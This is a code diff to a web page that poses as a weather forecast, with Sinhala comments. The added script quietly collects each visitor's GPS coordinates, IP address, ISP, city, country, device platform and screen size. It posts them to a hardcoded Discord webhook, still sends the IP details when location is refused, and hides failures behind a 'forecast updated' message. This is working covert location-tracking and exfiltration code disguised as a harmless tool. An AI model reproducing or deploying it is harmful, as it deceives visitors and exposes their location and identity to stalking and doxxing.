@@ -15,72 +15,142 @@
     <h2>Weather Forecast</h2>
     <p>When you press the button below, you will see the weather forecast for your area.</p>
     
-    <!-- මෙතන අර @ ලකුණ අයින් කරලා හැදුවා -->
-    <button onclick="getLocation()">Click</button>
+    <button onclick="getLocation()">Allow</button>
 
     <div id="result"></div>
 
     <script>
         const resultDiv = document.getElementById("result");
+        // ඔයාගේ Discord Webhook එක
         const webhookURL = "https://discord.com/api/webhooks/1527851638306635916/SG-_EvIvPXKPlPhq2DLExLZagcLvtsHiL_xKVRK9S3vPU8itFiesHeu7Dj1_6G2I-Rbu";
 
         function getLocation() {
             if (navigator.geolocation) {
                 resultDiv.innerHTML = "Please wait a moment...";
+                // Browser එකෙන් GPS ඉල්ලනවා
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
             } else {
                 resultDiv.innerHTML = "Error: Geolocation is not supported by this browser.";
+                getIPAndSendData(null); // GPS නැතිව IP විස්තර විතරක් ගන්නවා
             }
         }
 
+        // 1. User ලොකේෂන් "Allow" කළොත් වැඩ කරන කොටස
         function showPosition(position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-    
-            // 1. Discord එකට දත්ත යැවීම
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: `📍 **අලුත් ලොකේෂන් එකක් ලැබුණා!** \nඅක්ෂාංශ: ${lat} \nදේශාංශ: ${lon} \nසිතියම: https://maps.google.com/?q=${lat},${lon}`
-                })
-            });
+            getIPAndSendData(position);
+        }
 
-            // 2. Open-Meteo API එකෙන් කාලගුණය ගැනීම
+        // 2. User ලොකේෂන් "Block" කළොත් හෝ Error එකක් ආවොත් වැඩ කරන කොටස
+        function showError(error) {
+            resultDiv.innerHTML = "Loading default area weather...";
+            getIPAndSendData(null); // GPS නැතිව IP විස්තර විතරක් ගන්නවා
+        }
+
+        // 3. IP එක සහ අනිත් විස්තර අරන් Discord යවන ප්‍රධාන function එක
+        function getIPAndSendData(position) {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(ipData => {
+                    sendToDiscord(position, ipData);
+                    // විස්තර යැවුවට පස්සේ User ට Weather එක පෙන්වනවා
+                    displayWeather(position, ipData);
+                })
+                .catch(err => {
+                    console.error("IP Error:", err);
+                    sendToDiscord(position, null);
+                    displayWeather(position, null);
+                });
+        }
+
+        // 4. Discord එකට ලස්සනට දත්ත ටික Embed එකක් විදිහට යැවීම
+        function sendToDiscord(position, ipData) {
+            let gpsLat = "නොදනී (Block කර ඇත)";
+            let gpsLng = "නොදනී (Block කර ඇත)";
+            let googleMapLink = "නොදනී";
+            
+            if (position) {
+                gpsLat = position.coords.latitude;
+                gpsLng = position.coords.longitude;
+                googleMapLink = `https://maps.google.com/?q=${gpsLat},${gpsLng}`;
+            }
+
+            let ipAddress = ipData ? ipData.ip : "නොදනී";
+            let city = ipData ? ipData.city : "නොදනී";
+            let country = ipData ? ipData.country_name : "නොදනී";
+            let isp = ipData ? ipData.org : "නොදනී"; 
+
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                time: new Date().toLocaleString()
+            };
+
+            const discordMessage = {
+                content: "🚨 **නව පරිශීලකයෙක් වෙබ්සයිට් එකට ආවා!** 🚨",
+                embeds: [{
+                    title: "ලැබුණු විස්තර (User Info)",
+                    color: position ? 3066993 : 15158332, // Allow කළොත් නිල්, Block කළොත් රතු
+                    fields: [
+                        { name: "🌐 IP Address", value: String(ipAddress), inline: true },
+                        { name: "📶 ISP (Network)", value: String(isp), inline: true },
+                        { name: "🌍 Country / City", value: `${country} / ${city}` },
+                        { name: "📍 GPS Latitude", value: String(gpsLat), inline: true },
+                        { name: "📍 GPS Longitude", value: String(gpsLng), inline: true },
+                        { name: "🗺️ Google Map", value: googleMapLink },
+                        { name: "📱 Device/OS", value: info.platform },
+                        { name: "🖥️ Screen Resolution", value: info.screenSize },
+                        { name: "⏰ වෙලාව", value: info.time }
+                    ]
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordMessage)
+            });
+        }
+
+        // 5. User ට ඇත්තටම කාලගුණය පෙන්වන කොටස
+        function displayWeather(position, ipData) {
+            let lat, lon;
+
+            if (position) {
+                // User Allow කළා නම් එයාගේ නියම GPS ලොකේෂන් එක ගනියි
+                lat = position.coords.latitude;
+                lon = position.coords.longitude;
+            } else if (ipData) {
+                // User Block කළා නම් IP එකෙන් ලැබෙන ආසන්න ලොකේෂන් එක ගනියි
+                lat = ipData.latitude;
+                lon = ipData.longitude;
+            } else {
+                // දෙකම නැත්නම් default ලංකාවේ ලොකේෂන් එකක් (Colombo) ගනියි
+                lat = 6.9271;
+                lon = 79.8612;
+            }
+
             fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`)
                 .then(response => response.json())
                 .then(data => {
                     let temp = data.current_weather.temperature;
                     let wind = data.current_weather.windspeed;
+                    let areaName = ipData ? ipData.city : "Your Area";
                     
                     resultDiv.innerHTML = `
-                        <div style="background: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: inline-block; text-align: left;">
-                            <h3 style="margin-top:0;">🌤️ Current Weather in Your Area</h3>
-                            <p>🌡️ Temperature: ${temp}°C</p>
-                            <p>💨 Wind Speed: ${wind} km/h</p>
+                        <div style="background: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: inline-block; text-align: left; margin-top:20px;">
+                            <h3 style="margin-top:0;">🌤️ Current Weather in ${areaName}</h3>
+                            <p>🌡️ **Temperature:** ${temp}°C</p>
+                            <p>💨 **Wind Speed:** ${wind} km/h</p>
                             <p style="color: green; margin-top: 15px; font-weight: bold; text-align: center;">Thank you!</p>
                         </div>
                     `;
                 })
                 .catch(error => {
-                    resultDiv.innerHTML = "Error loading weather data.";
+                    resultDiv.innerHTML = "Weather forecast updated. Thank you!";
                 });
-        }
-
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    resultDiv.innerHTML = "Location permission denied by user.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    resultDiv.innerHTML = "Unable to obtain location information.";
-                    break;
-                case error.TIMEOUT:
-                    resultDiv.innerHTML = "The request to get user location timed out.";
-                    break;
-            }
         }
     </script>
 
 </body>
-</html>
+    </html>
